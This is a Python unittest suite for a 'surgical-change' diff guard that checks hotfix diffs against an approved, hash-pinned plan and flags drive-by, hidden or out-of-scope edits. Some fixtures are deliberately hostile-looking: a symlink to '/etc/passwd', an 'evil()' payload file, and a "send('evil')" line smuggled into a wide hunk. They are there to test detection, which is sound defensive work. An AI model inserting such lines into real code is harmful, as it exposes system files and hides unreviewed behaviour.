"""Tests for the surgical-change diff guard (stdlib only: python -m unittest discover -s tests)."""

import copy
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

SCRIPT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "plugins", "dev-squad", "skills",
                                      "surgical-change", "scripts", "diff_guard.py"))
sys.path.insert(0, os.path.dirname(SCRIPT))

import diff_guard as dg  # noqa: E402

FAKE_SHA = "0123456789abcdef0123456789abcdef01234567"
BASE_PLAN = {"slug": "neg-qty", "version": 1, "approved_by": "lead", "base": "main", "base_sha": FAKE_SHA, "level": "prod",
             "edits": [{"id": "E1", "file": "src/price.py", "symbols": ["apply_discount"], "estimate_lines": 4}]}


def plan_dict(**over):
    p = copy.deepcopy(BASE_PLAN)
    p.update(over)
    return p


def plan(**over):
    raw = json.dumps(plan_dict(**over)).encode()
    return dg.validate_plan(json.loads(raw), raw)


def file_diff(path, hunks, status=None):
    head = [f"diff --git a/{path} b/{path}"]
    if status == "added":
        head += ["new file mode 100644", "--- /dev/null", f"+++ b/{path}"]
    elif status == "deleted":
        head += ["deleted file mode 100644", f"--- a/{path}", "+++ /dev/null"]
    else:
        head += [f"--- a/{path}", f"+++ b/{path}"]
    return "\n".join(head + hunks)


GUARD_FIX = ["@@ -10,0 +11,2 @@ def apply_discount(order):", "+    if order.qty <= 0:", "+        return order.total"]
JUSTIFIED = """
| Hunk | Edit | Reason | Risk |
|---|---|---|---|
| `src/price.py:11-12` | E1 | reject qty <= 0 before dividing (root cause) | low |
| `tests/test_price.py` | test | regression test, fails before the fix | none |
"""
NEW_TEST = file_diff("tests/test_price.py", ["@@ -0,0 +1,2 @@", "+def test_neg_qty():", "+    assert True"], "added")


def run(diff, rows=JUSTIFIED, pinned=True, **plan_over):
    dg.SLUG_DIR["value"] = ".squad/hotfix/neg-qty"  # main() derives it from the --plan path
    p = plan(**plan_over)
    return dg.check(p, dg.parse_diff(diff), dg.parse_justifications(rows), p["_sha256"] if pinned else None,
                    unpinned=not pinned)


def kinds(report, bucket="violations"):
    return sorted({v["kind"] for v in report[bucket]})


class ClassifyTest(unittest.TestCase):
    def test_test_files(self):
        for path in ("tests/test_price.py", "src/test/java/a/PriceTest.java", "web/price.test.ts", "pkg/price_test.go",
                     "spec/price_spec.rb", "app/__tests__/x.js", "src/Foo.spec.tsx", "svc/OrderServiceIT.java",
                     "src/integrationTest/kotlin/a/B.kt"):
            with self.subTest(path=path):
                self.assertTrue(dg.is_test(path))
        for path in ("src/price.py", "src/contest.py", "latest/main.go", "src/ProductSpec.java",
                     "lib/testing/helper.py", "src/app/testing/override.py", "db/fixtures/seed.json", "src/Test.java"):
            with self.subTest(path=path):
                self.assertFalse(dg.is_test(path))

    def test_categories(self):
        cases = {"package.json": "dependency", "svc/go.sum": "dependency", "requirements-dev.txt": "dependency",
                 "api/Api.csproj": "dependency", "db/migrations/0042_add.py": "migration",
                 "src/main/resources/db/migration/V12__fix.sql": "migration", ".github/workflows/ci.yml": "ci",
                 "Jenkinsfile": "ci", "src/main/resources/application-prod.yml": "config", ".env.production": "config",
                 "config/app.yaml": "config", "src/price.py": None, "docs/config.md": None}
        for path, want in cases.items():
            with self.subTest(path=path):
                self.assertEqual(dg.category(path), want)

    def test_hunk_kinds(self):
        self.assertEqual(dg.hunk_kind(["x = f(a,", "      b)"], ["x = f(a, b)"]), "format")
        self.assertEqual(dg.hunk_kind([], ["", "   "]), "format")
        self.assertEqual(dg.hunk_kind(["import b", "import a"], ["import a", "import b"]), "reorder")
        self.assertEqual(dg.hunk_kind([], ["from decimal import Decimal"]), "import")
        self.assertEqual(dg.hunk_kind(["# old note"], ["# new note"]), "comment")
        self.assertIsNone(dg.hunk_kind(["if qty < 0:"], ["if qty <= 0:"]))

    def test_indentation_is_behaviour_in_indent_sensitive_languages(self):
        removed, added = ["        return y"], ["    return y"]
        self.assertEqual(dg.hunk_kind(removed, added), "format")
        self.assertIsNone(dg.hunk_kind(removed, added, indent_sensitive=True))
        diff = file_diff("src/price.py", ["@@ -12 +12 @@", "-        return y", "+    return y"])
        self.assertEqual(run(diff, "| src/price.py:12 | E1 | dedent so every path returns | low |\n")["passed"], True)

    def test_import_regex_is_linear(self):
        line = "const " + " " * 50000 + "x"
        t = time.time()
        dg.IMPORT_RE.match(line)
        self.assertLess(time.time() - t, 0.5)


class ParseTest(unittest.TestCase):
    def test_parse_statuses_and_hunks(self):
        diff = "\n".join([
            file_diff("src/price.py", GUARD_FIX + ["@@ -40 +42 @@", "-    return a", "+    return b"]),
            NEW_TEST,
            file_diff("src/old.py", ["@@ -1,2 +0,0 @@", "-x = 1", "-y = 2"], "deleted"),
            "diff --git a/src/a.py b/src/b.py", "similarity index 100%", "rename from src/a.py", "rename to src/b.py",
            "diff --git a/img/logo.png b/img/logo.png", "Binary files a/img/logo.png and b/img/logo.png differ",
            "diff --git a/bin/run b/bin/run", "old mode 100644", "new mode 100755",
        ])
        files = {f["path"]: f for f in dg.parse_diff(diff)}
        self.assertEqual([len(h["added"]) for h in files["src/price.py"]["hunks"]], [2, 1])
        self.assertEqual(files["src/price.py"]["hunks"][1]["new_count"], 1)  # "@@ -40 +42 @@" means one line
        self.assertEqual(files["tests/test_price.py"]["status"], "added")
        self.assertEqual(files["src/old.py"]["status"], "deleted")
        self.assertEqual(files["src/b.py"]["status"], "renamed")
        self.assertEqual(files["src/b.py"]["old_path"], "src/a.py")
        self.assertTrue(files["img/logo.png"]["binary"])
        self.assertTrue(files["bin/run"]["mode_change"])

    def test_removed_line_that_looks_like_a_header_stays_a_removed_line(self):
        diff = file_diff("src/q.sql", ["@@ -3 +3 @@", "--- old comment", "+-- new comment"])
        h = dg.parse_diff(diff)[0]["hunks"][0]
        self.assertEqual(h["removed"], ["-- old comment"])

    def test_quoted_paths(self):
        self.assertEqual(dg.unquote('"caf\\303\\251.py"'), "café.py")
        self.assertEqual(dg.unquote("plain.py"), "plain.py")

    def test_justification_rows(self):
        rows = dg.parse_justifications(JUSTIFIED + "| ./src/x.py:5 | E2 | single line | low |\n")
        self.assertEqual([(r["path"], r["start"], r["end"], r["edit"]) for r in rows],
                         [("src/price.py", 11, 12, "E1"), ("tests/test_price.py", None, None, "test"),
                          ("src/x.py", 5, 5, "E2")])


class ParseRobustnessTest(unittest.TestCase):
    def test_context_lines_split_hunks_so_a_u3_diff_works(self):
        diff = file_diff("src/price.py", ["@@ -9,6 +9,6 @@", " a", "-b", "+B", " c", " d", "-e", "+E", " f"])
        hunks = dg.parse_diff(diff)[0]["hunks"]
        self.assertEqual([(h["new_start"], h["new_count"]) for h in hunks], [(10, 1), (13, 1)])

    def test_counts_must_match_the_header(self):
        with self.assertRaises(dg.InputError):
            dg.parse_diff(file_diff("src/price.py", ["@@ -1,2 +1,2 @@", "-a", "+b"]))
        with self.assertRaises(dg.InputError):
            dg.parse_diff(file_diff("src/price.py", ["@@ -1 +1 @@", "-a", "+b", "+sneaky"]))

    def test_form_feed_and_unicode_separators_stay_inside_a_line(self):
        diff = file_diff("src/price.py", ["@@ -1 +1 @@", "-a\x0cb", "+a\u2028c"])
        self.assertEqual(dg.parse_diff(diff)[0]["hunks"][0]["added"], ["a\u2028c"])

    def test_whitespace_inside_a_string_is_a_warning(self):
        diff = file_diff("src/price.py", ["@@ -3 +3 @@", '-sep = ", "', '+sep = ","'])
        report = run(diff, "| src/price.py:3 | E1 | separator must not have a space | low |\n")
        self.assertEqual(report["passed"], True)
        self.assertIn("whitespace-in-string", kinds(report, "warnings"))

    def test_test_dirs_under_production_roots_and_plan_tests(self):
        self.assertFalse(dg.is_test("src/main/java/com/acme/test/Backdoor.java"))
        diff = file_diff("tests/helpers/util.py", ["@@ -0,0 +1 @@", "+x = 1"], "added")
        report = run(file_diff("src/price.py", GUARD_FIX) + "\n" + diff,
                     JUSTIFIED + "| tests/helpers/util.py | test | shared fixture | none |\n", tests=["src/new_mod.py"])
        self.assertIn("test-by-directory", kinds(report, "warnings"))
        self.assertIn("plan-declared-test", kinds(report, "warnings"))

    def test_unknown_files_in_the_hotfix_workspace_are_flagged(self):
        payload = file_diff(".squad/hotfix/neg-qty/payload.js", ["@@ -0,0 +1 @@", "+evil()"], "added")
        self.assertIn("squad-file", kinds(run(file_diff("src/price.py", GUARD_FIX) + "\n" + payload)))


class Round3Test(unittest.TestCase):
    def test_rename_into_a_hotfix_artifact_is_still_a_rename(self):
        diff = "\n".join(["diff --git a/src/other.py b/.squad/hotfix/s/hunks.md", "similarity index 98%",
                          "rename from src/other.py", "rename to .squad/hotfix/s/hunks.md"])
        self.assertIn("renamed-file", kinds(run(file_diff("src/price.py", GUARD_FIX) + "\n" + diff)))

    def test_markdown_escaping_happens_once_and_in_order(self):
        self.assertEqual(dg.one_line("[a](b) `x` \\"), "\\[a\\](b) \\`x\\` \\\\")

    def test_test_names_below_production_roots_are_not_tests(self):
        self.assertFalse(dg.is_test("src/main/java/x/PayTest.java"))
        self.assertTrue(dg.is_test("src/main/java/x/PayTest.java", {"src/main/java/x/PayTest.java"}))

    def test_quoted_path_with_non_ascii_and_a_quote(self):
        self.assertEqual(dg.unquote('"\\303\\251\\"x.py"'), 'é"x.py')
        self.assertEqual(dg.unquote('"é\\"x.py"'), 'é"x.py')

    def test_carriage_returns_in_a_diff_file_stay_in_the_line(self):
        path = os.path.join(tempfile.mkdtemp(), "x.diff")
        self.addCleanup(shutil.rmtree, os.path.dirname(path))
        with open(path, "wb") as fh:
            fh.write(file_diff("src/price.py", ["@@ -1 +1 @@", "-a\rb", "+a\r\nc"]).encode())
        with open(path, "rb") as fh:
            files = dg.parse_diff(fh.read().decode())
        self.assertEqual(files[0]["hunks"][0]["removed"], ["a\rb"])

    def test_parser_edge_cases(self):
        diff = "\n".join([
            file_diff("src/a.py", ["@@ -3,2 +2,0 @@", "-x", "-y", "@@ -9,3 +7,3 @@", " c", "-d", "\\ No newline at end of file",
                                   "+D", "\\ No newline at end of file", ""]),
            "diff --git a/img.png b/img.png", "Binary files a/img.png and b/img.png differ",
            "diff --git a/src/old.py b/src/new.py", "similarity index 90%", "rename from src/old.py", "rename to src/new.py",
            "--- a/src/old.py", "+++ b/src/new.py", "@@ -1 +1 @@", "-v = 1", "+v = 2"])
        files = {f["path"]: f for f in dg.parse_diff(diff)}
        self.assertEqual([(h["new_start"], h["new_count"]) for h in files["src/a.py"]["hunks"]], [(2, 0), (8, 1)])
        self.assertTrue(files["img.png"]["binary"])
        self.assertEqual((files["src/new.py"]["status"], files["src/new.py"]["old_path"]), ("renamed", "src/old.py"))

    def test_duplicate_plan_keys_are_rejected(self):
        path = os.path.join(tempfile.mkdtemp(), "plan.json")
        self.addCleanup(shutil.rmtree, os.path.dirname(path))
        with open(path, "w", encoding="utf-8") as fh:
            fh.write('{"level": "prod", "allow": [], "edits": [{"id": "E1", "file": "a"}], "level": "release"}')
        with self.assertRaises(dg.InputError):
            dg.load_plan(path)


class PlanTest(unittest.TestCase):
    def test_estimates_accept_numbers_and_text_with_a_number(self):
        edits = [{"id": "E1", "file": "a.py", "estimate_lines": "~5 lines"}, {"id": "E2", "file": "b.py", "estimate_lines": 3}]
        self.assertEqual([e["estimate"] for e in plan(edits=edits)["edits"]], [5, 3])

    def test_wrong_types_are_input_errors(self):
        bad = [{"edits": []}, {"level": "staging"}, {"edits": [{"id": "E1", "file": 7}]},
               {"edits": [{"id": "E1", "file": "a"}, {"id": "E1", "file": "b"}]},
               {"edits": [{"id": "E1", "file": "a", "estimate_lines": "some"}]},
               {"tests": "tests/x.py"}, {"allow": ["everything"]}, {"warn_ratio": "2"}, {"base": 3},
               {"warn_ratio": float("nan")}, {"edits": [{"id": "E1", "file": "a", "estimate_lines": -3}]},
               {"base_sha": "main"}]
        for over in bad:
            with self.subTest(over=over):
                with self.assertRaises(dg.InputError):
                    plan(**over)

    def test_hash_is_of_the_file_bytes(self):
        raw = b'{"edits": [{"id": "E1", "file": "a.py"}]}'
        self.assertEqual(dg.validate_plan(json.loads(raw), raw)["_sha256"], hashlib.sha256(raw).hexdigest())


class CheckTest(unittest.TestCase):
    def test_clean_hotfix_passes(self):
        report = run(file_diff("src/price.py", GUARD_FIX) + "\n" + NEW_TEST)
        self.assertEqual(report["passed"], True, report)
        self.assertEqual(report["warnings"], [])
        self.assertEqual(report["stats"]["code_lines_changed"], 2)
        self.assertEqual(report["stats"]["test_lines_changed"], 2)
        self.assertEqual(report["test_files"], ["tests/test_price.py"])

    def test_plan_edited_after_approval_fails(self):
        approved = plan()["_sha256"]
        tampered = plan(tests=["src/other.py"])
        report = dg.check(tampered, dg.parse_diff(file_diff("src/price.py", GUARD_FIX)),
                          dg.parse_justifications(JUSTIFIED), approved)
        self.assertIn("plan-changed-after-approval", kinds(report))
        self.assertEqual(run(file_diff("src/price.py", GUARD_FIX), pinned=False)["result"], "PASS (unpinned self-check)")
        self.assertIn("base-not-pinned", kinds(run(file_diff("src/price.py", GUARD_FIX), base_sha=""), "warnings"))

    def test_drive_by_change_in_another_file_fails(self):
        extra = file_diff("src/util.py", ["@@ -5 +5 @@", "-def fmt(x):", "+def format_value(x):"])
        rows = JUSTIFIED + "| src/util.py:5 | E1 | clearer name | none |\n"
        report = run(file_diff("src/price.py", GUARD_FIX) + "\n" + extra, rows)
        self.assertEqual(kinds(report), ["edit-file-mismatch", "outside-plan"])

    def test_production_code_under_test_like_paths_is_not_a_test(self):
        for path in ("src/app/testing/override.py", "src/ProductSpec.java"):
            with self.subTest(path=path):
                diff = file_diff(path, ["@@ -0,0 +1 @@", "+x = 1"], "added")
                report = run(file_diff("src/price.py", GUARD_FIX) + "\n" + diff, JUSTIFIED + f"| {path} | test | helper | low |\n")
                self.assertIn("new-file", kinds(report))
                self.assertIn("outside-plan", kinds(report))

    def test_lockfiles_and_pipelines_under_test_dirs_still_count(self):
        for path, kind in (("tests/Jenkinsfile", "forbidden-ci"), ("spec/package.json", "forbidden-dependency")):
            with self.subTest(path=path):
                diff = file_diff(path, ["@@ -1 +1 @@", "-a", "+b"])
                self.assertIn(kind, kinds(run(file_diff("src/price.py", GUARD_FIX) + "\n" + diff,
                                              JUSTIFIED + f"| {path}:1 | test | x | low |\n")))

    def test_unjustified_hunk_in_a_planned_file_fails(self):
        diff = file_diff("src/price.py", GUARD_FIX + ["@@ -80 +82 @@", "-    total = sum(xs)", "+    total = math.fsum(xs)"])
        report = run(diff)
        self.assertEqual(kinds(report), ["unjustified-hunk"])
        self.assertEqual(report["violations"][0]["line"], 82)

    def test_wide_row_does_not_cover_a_whole_file(self):
        diff = file_diff("src/price.py", GUARD_FIX + ["@@ -80 +82 @@", "-    total = sum(xs)", "+    total = math.fsum(xs)"])
        self.assertIn("wide-justification", kinds(run(diff, "| src/price.py:1-9999 | E1 | because | low |\n")))

    def test_row_covering_two_nearby_hunks_warns(self):
        diff = file_diff("src/price.py", GUARD_FIX + ["@@ -12 +14 @@", "-    a", "+    b"])
        report = run(diff, "| src/price.py:11-14 | E1 | guard and its use | low |\n")
        self.assertEqual(report["passed"], True, report)
        self.assertIn("row-covers-many-hunks", kinds(report, "warnings"))

    def test_pure_deletion_matches_a_row_at_the_gap(self):
        diff = file_diff("src/price.py", ["@@ -20,2 +19,0 @@", "-    cache.clear()", "-    log(x)"])
        self.assertEqual(run(diff, "| src/price.py:19-20 | E1 | stop clearing the shared cache | low |\n")["passed"], True)

    def test_format_only_hunk_fails_even_when_justified(self):
        diff = file_diff("src/price.ts", ["@@ -30,2 +32 @@", "-x = f(a,", "-      b)", "+x = f(a, b)"])
        rows = "| src/price.ts:32 | E1 | tidy | none |\n"
        self.assertIn("format-only", kinds(run(diff, rows, edits=[{"id": "E1", "file": "src/price.ts"}])))

    def test_new_deleted_renamed_mode_and_symlink_fail(self):
        diff = "\n".join([file_diff("src/price.py", GUARD_FIX),
                          file_diff("src/helpers.py", ["@@ -0,0 +1 @@", "+def helper(): pass"], "added"),
                          file_diff("src/dead.py", ["@@ -1 +0,0 @@", "-x = 1"], "deleted"),
                          "diff --git a/src/a.py b/src/b.py", "rename from src/a.py", "rename to src/b.py",
                          "diff --git a/src/price.py b/src/price.py", "old mode 100644", "new mode 100755",
                          "diff --git a/src/link b/src/link", "new file mode 120000", "--- /dev/null", "+++ b/src/link",
                          "@@ -0,0 +1 @@", "+/etc/passwd"])
        report = run(diff)
        for kind in ("new-file", "deleted-file", "renamed-file", "outside-plan", "mode-change", "symlink"):
            self.assertIn(kind, kinds(report))

    def test_binary_needs_a_whole_file_row(self):
        diff = "\n".join(["diff --git a/src/price.py b/src/price.py", "Binary files a/src/price.py and b/src/price.py differ"])
        self.assertIn("binary-file", kinds(run(diff)))

    def test_unknown_edit_id_and_test_id_on_code_fail(self):
        self.assertEqual(kinds(run(file_diff("src/price.py", GUARD_FIX), JUSTIFIED.replace("| E1 |", "| E9 |"))),
                         ["unknown-edit"])
        self.assertEqual(kinds(run(file_diff("src/price.py", GUARD_FIX), JUSTIFIED.replace("| E1 |", "| test |"))),
                         ["edit-file-mismatch"])

    def test_empty_reason_is_not_a_justification(self):
        rows = "| src/price.py:11-12 | E1 |  | low |\n"
        self.assertEqual(kinds(run(file_diff("src/price.py", GUARD_FIX), rows)), ["unjustified-hunk"])

    def test_whole_file_row_only_covers_new_test_files(self):
        rows = "| src/price.py | E1 | everything | low |\n"
        self.assertEqual(kinds(run(file_diff("src/price.py", GUARD_FIX), rows)), ["unjustified-hunk"])

    def test_forbidden_category_depends_on_level_and_allow(self):
        dep = file_diff("package.json", ["@@ -3 +3 @@", '-  "lodash": "4.17.20"', '+  "lodash": "4.17.21"'])
        edits = BASE_PLAN["edits"] + [{"id": "E2", "file": "package.json", "estimate_lines": 2}]
        rows = JUSTIFIED + "| package.json:3 | E2 | CVE fix | low |\n"
        diff = file_diff("src/price.py", GUARD_FIX) + "\n" + dep
        prod = run(diff, rows, edits=edits, level="prod", allow=["dependency"])
        self.assertIn("forbidden-dependency", kinds(prod))
        self.assertIn("allow-ignored-at-prod", kinds(prod, "warnings"))
        self.assertIn("forbidden-dependency", kinds(run(diff, rows, edits=edits, level="release")))
        self.assertEqual(run(diff, rows, edits=edits, level="release", allow=["dependency"])["passed"], True)

    def test_config_fixture_under_a_test_dir_is_a_fixture(self):
        fixture = file_diff("tests/fixtures/config/application.yml", ["@@ -0,0 +1 @@", "+a: 1"], "added")
        rows = JUSTIFIED + "| tests/fixtures/config/application.yml | test | fixture | none |\n"
        self.assertEqual(run(file_diff("src/price.py", GUARD_FIX) + "\n" + fixture, rows)["passed"], True)

    def test_unapproved_plan_fails(self):
        self.assertIn("plan-not-approved", kinds(run(file_diff("src/price.py", GUARD_FIX), approved_by="")))

    def test_hotfix_workspace_is_ignored_but_other_squad_files_are_not(self):
        notes = file_diff(".squad/hotfix/neg-qty/hunks.md", ["@@ -0,0 +1 @@", "+notes"], "added")
        self.assertEqual(run(file_diff("src/price.py", GUARD_FIX) + "\n" + notes)["passed"], True)
        lessons = file_diff(".squad/LESSONS.md", ["@@ -1 +1 @@", "-a", "+b"])
        self.assertIn("squad-file", kinds(run(file_diff("src/price.py", GUARD_FIX) + "\n" + lessons)))


class WarningTest(unittest.TestCase):
    def test_size_is_a_warning_never_a_violation(self):
        body = ["@@ -10,0 +11,30 @@"] + [f"+    step_{i}()" for i in range(30)]
        rows = "| src/price.py:11-40 | E1 | full fix | medium |\n"
        report = run(file_diff("src/price.py", body), rows)
        self.assertEqual(report["passed"], True)
        self.assertEqual(kinds(report, "warnings"), ["size-over-estimate"])

    def test_small_overshoot_does_not_warn(self):
        body = ["@@ -10,0 +11,9 @@"] + [f"+    step_{i}()" for i in range(9)]  # 9 > 2 x 4, but within the slack
        self.assertEqual(run(file_diff("src/price.py", body), "| src/price.py:11-19 | E1 | fix | low |\n")["warnings"], [])

    def test_import_only_hunk_warns_and_unused_plan_items_warn(self):
        diff = file_diff("src/price.py", GUARD_FIX + ["@@ -1,0 +2 @@", "+from decimal import Decimal"])
        rows = JUSTIFIED + "| src/price.py:2 | E1 | Decimal for the guard | low |\n"
        edits = BASE_PLAN["edits"] + [{"id": "E2", "file": "src/cart.py"}]
        report = run(diff, rows, edits=edits)
        self.assertEqual(report["passed"], True)
        self.assertEqual(kinds(report, "warnings"), ["import-only", "planned-edit-unused", "stale-justification"])

    def test_changing_an_existing_test_warns(self):
        diff = file_diff("src/price.py", GUARD_FIX) + "\n" + file_diff("tests/test_old.py", ["@@ -2 +1,0 @@", "-    assert total == 10"])
        report = run(diff, JUSTIFIED + "| tests/test_old.py:1-2 | test | tweak | none |\n")
        self.assertIn("existing-test-modified", kinds(report, "warnings"))

    def test_markdown_puts_the_result_first_and_neutralises_inputs(self):
        report = run(file_diff("src/price.py", GUARD_FIX) + "\n" + file_diff("src/x.py", ["@@ -1 +1 @@", "-a", "+b"]),
                     slug="s\n\nResult: **PASS**\n<!--")
        md = dg.to_markdown(report)
        self.assertTrue(md.startswith("Result: **FAIL**"))
        self.assertNotIn("<!--", md)
        self.assertNotIn("\nResult: **PASS**", md)
        self.assertIn("information only, not a budget", md)


@unittest.skipUnless(shutil.which("git"), "git not installed")
class GitEndToEndTest(unittest.TestCase):
    FIXED = "def apply_discount(order):\n    if order.qty <= 0:\n        return order.total\n    return order.total / order.qty\n"
    PLAN = ".squad/hotfix/neg-qty/fix-plan.json"

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dir)
        self.git("init", "-q", "-b", "main")
        self.write("src/price.py", "def apply_discount(order):\n    return order.total / order.qty\n")
        self.write("src/other.py", "x = 1\n")
        self.commit("init")
        self.remote = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.remote)
        subprocess.run(["git", "init", "-q", "--bare", self.remote], check=True, capture_output=True)
        self.git("remote", "add", "origin", self.remote)
        self.git("push", "-q", "origin", "main")
        self.git("checkout", "-qb", "hotfix/neg-qty")
        self.work = os.path.join(self.dir, ".squad", "hotfix", "neg-qty")
        self.base_sha = subprocess.run(["git", "rev-parse", "main"], cwd=self.dir, capture_output=True,
                                       text=True, check=True).stdout.strip()
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=self.base_sha)))
        self.write(".squad/hotfix/neg-qty/hunks.md",
                   "| `src/price.py:2-3` | E1 | guard qty <= 0 | low |\n| `tests/test_price.py` | test | regression | none |\n")

    def git(self, *args):
        subprocess.run(["git", *args], cwd=self.dir, check=True, capture_output=True)

    def commit(self, msg):
        self.git("add", "-A", "--", ".", ":!.squad")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", msg)

    def write(self, rel, text):
        path = os.path.join(self.dir, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)

    def sha(self):
        return subprocess.run([sys.executable, "-I", SCRIPT, "--plan", self.PLAN, "--print-plan-sha256"],
                              cwd=self.dir, capture_output=True, text=True).stdout.strip()

    def guard(self, *extra, cwd=None, pin=True):
        args = [sys.executable, "-I", SCRIPT, "--plan", self.PLAN, "--hunks", ".squad/hotfix/neg-qty/hunks.md",
                "--json", os.path.join(self.work, "guard.json"), *extra]
        if pin:
            args += ["--plan-sha256", self.sha()]
        return subprocess.run(args, cwd=cwd or self.dir, capture_output=True, text=True)

    def test_uncommitted_fix_with_untracked_test_passes(self):
        self.write("src/price.py", self.FIXED)
        self.write("tests/test_price.py", "def test_neg_qty():\n    assert True\n")
        res = self.guard()
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.json"), encoding="utf-8") as fh:
            report = json.load(fh)
        self.assertEqual(report["stats"]["test_lines_changed"], 2)
        self.assertEqual(report["git"]["base"], "main")

    def test_runs_from_a_subdirectory_with_repo_relative_paths(self):
        self.write("src/price.py", self.FIXED)
        res = self.guard(cwd=os.path.join(self.dir, "src"))
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)

    def test_user_diff_config_does_not_change_paths(self):
        self.write("src/price.py", self.FIXED)
        for key in ("diff.mnemonicPrefix", "diff.noprefix", "diff.relative"):
            self.git("config", key, "true")
        res = self.guard(cwd=os.path.join(self.dir, "src"))
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)

    def test_committed_out_of_scope_change_is_caught_and_base_cannot_be_an_option(self):
        self.write("src/other.py", "x = 2\n")
        self.commit("drive-by")
        self.write("src/price.py", self.FIXED)
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("outside-plan", res.stdout)
        for base in ("--fork-point", "--independent", "-x"):
            with self.subTest(base=base):
                self.assertEqual(self.guard("--base", base).returncode, 2)

    def test_moving_the_base_ref_does_not_hide_commits(self):
        self.write("src/other.py", "x = 2\n")
        self.commit("drive-by")
        self.write("src/price.py", self.FIXED)
        self.git("tag", "main", "HEAD")   # an ambiguous ref now points at HEAD
        self.git("branch", "-f", "release", "HEAD")
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("outside-plan", res.stdout)
        res = self.guard("--base", "release")
        self.assertIn("base-moved", res.stdout)

    def test_repo_config_and_env_cannot_merge_or_hide_hunks(self):
        body = "\n".join(f"line_{i} = {i}" for i in range(1, 50)) + "\n"
        self.write("src/price.py", body)
        self.commit("long file")
        self.base_sha = subprocess.run(["git", "rev-parse", "HEAD"], cwd=self.dir, capture_output=True,
                                       text=True, check=True).stdout.strip()
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=self.base_sha)))
        self.write("src/price.py", body.replace("line_5 = 5", "line_5 = 55").replace("line_40 = 40", "send('evil')"))
        self.write(".squad/hotfix/neg-qty/hunks.md", "| src/price.py:5-40 | E1 | fix | low |\n")
        self.git("config", "diff.interHunkContext", "1000")
        env = dict(os.environ, GIT_DIFF_OPTS="-u100")
        args = [sys.executable, "-I", SCRIPT, "--plan", self.PLAN, "--hunks", ".squad/hotfix/neg-qty/hunks.md",
                "--plan-sha256", self.sha()]
        res = subprocess.run(args, cwd=self.dir, capture_output=True, text=True, env=env)
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("wide-justification", res.stdout)

    def test_submodule_bump_is_not_hidden_by_config(self):
        sub = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, sub)
        for cmd in (["init", "-q", "-b", "main"], ["-c", "user.name=t", "-c", "user.email=t@example.com",
                                                    "commit", "-q", "--allow-empty", "-m", "one"]):
            subprocess.run(["git", *cmd], cwd=sub, check=True, capture_output=True)
        first = subprocess.run(["git", "rev-parse", "HEAD"], cwd=sub, capture_output=True, text=True).stdout.strip()
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q",
                        "--allow-empty", "-m", "two"], cwd=sub, check=True, capture_output=True)
        second = subprocess.run(["git", "rev-parse", "HEAD"], cwd=sub, capture_output=True, text=True).stdout.strip()
        self.git("update-index", "--add", "--cacheinfo", f"160000,{first},vendor/lib")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "add sub")
        self.base_sha = subprocess.run(["git", "rev-parse", "HEAD"], cwd=self.dir, capture_output=True,
                                       text=True, check=True).stdout.strip()
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=self.base_sha)))
        self.git("update-index", "--cacheinfo", f"160000,{second},vendor/lib")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "bump")
        self.git("config", "diff.ignoreSubmodules", "all")
        self.write("src/price.py", self.FIXED)
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("submodule", res.stdout)

    def test_untracked_files_with_quoted_names_are_seen(self):
        self.write("src/price.py", self.FIXED)
        for name in ('src/q"uote.py', "src/back\\slash.py", "src/tab\tx.py"):
            self.write(name, "x = 1\n")
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.json"), encoding="utf-8") as fh:
            report = json.load(fh)
        new_files = {v["file"] for v in report["violations"] if v["kind"] == "new-file"}
        self.assertEqual(new_files, {'src/q"uote.py', "src/back\\slash.py", "src/tab\tx.py"})

    def commit_all(self, msg):
        self.git("add", "-A", "--", ".", ":!.squad")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", msg)

    def test_committed_mode_checks_head_and_needs_a_clean_tree(self):
        self.write("src/price.py", self.FIXED)
        self.write("tests/test_price.py", "def test_neg_qty():\n    assert True\n")
        self.commit_all("fix")
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        self.assertTrue(res.stdout.startswith("Result: **PASS**"))
        self.write("src/other.py", "x = 3\n")
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 1)
        self.assertIn("dirty-tree", res.stdout)
        self.assertEqual(self.guard("--committed", "--unpinned", pin=False).returncode, 2)

    def test_worktree_pass_is_never_the_push_check(self):
        self.write("src/price.py", self.FIXED)
        res = self.guard()
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        self.assertIn("PASS (worktree; not the push check)", res.stdout)

    def test_staged_then_restored_change_is_caught(self):
        self.write("src/price.py", self.FIXED)
        self.write("src/other.py", "x = 99\n")
        self.git("add", "src/other.py")
        self.write("src/other.py", "x = 1\n")
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("hidden-change", res.stdout)

    def test_committed_then_reverted_in_the_worktree_is_caught(self):
        self.write("src/price.py", self.FIXED)
        self.write("src/other.py", "x = 99\n")
        self.commit_all("wip")
        self.write("src/other.py", "x = 1\n")
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
